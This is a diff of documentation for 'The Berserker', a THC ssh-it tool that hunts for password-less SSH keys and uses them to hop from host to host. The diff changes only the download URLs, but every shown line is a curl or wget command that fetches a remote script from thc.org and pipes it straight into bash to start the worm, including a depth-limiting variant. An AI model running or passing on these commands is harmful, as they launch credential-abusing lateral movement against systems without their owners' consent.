@@ -19,13 +19,13 @@ __The Berserker__ looks for password-less ssh-keys (such as `~/.ssh/id_rsa`) and
 Use either one of these commands to start __The Berserker__:
 
 ```shell
-export BS="$(curl -fsSL ssh-it.thc.org/bs)" && bash -c "$BS"
+export BS="$(curl -fsSL https://thc.org/ssh-it/bs)" && bash -c "$BS"
 ```
 
 or:
 
 ```shell
-export BS="$(wget -O- ssh-it.thc.org/bs)" && bash -c "$BS"
+export BS="$(wget -O- https://thc.org/ssh-it/bs)" && bash -c "$BS"
 ```
 
 {:refdef: style="text-align: center;"}
@@ -43,7 +43,7 @@ Read [how it works](how-it-works/) and [design choices](how-it-works/) we made.
 The default is to stop after a depth of 8. Changing this to `BS_DEPTH=1` will make The Berserker log into the next host but not any farther.
 
 ```shell
-export BS="$(curl -fsSL ssh-it.thc.org/bs)" && bash -c "BS_DEPTH=1 $BS"
+export BS="$(curl -fsSL https://thc.org/ssh-it/bs)" && bash -c "BS_DEPTH=1 $BS"
 ```
 
 ## When HTTPS is not available
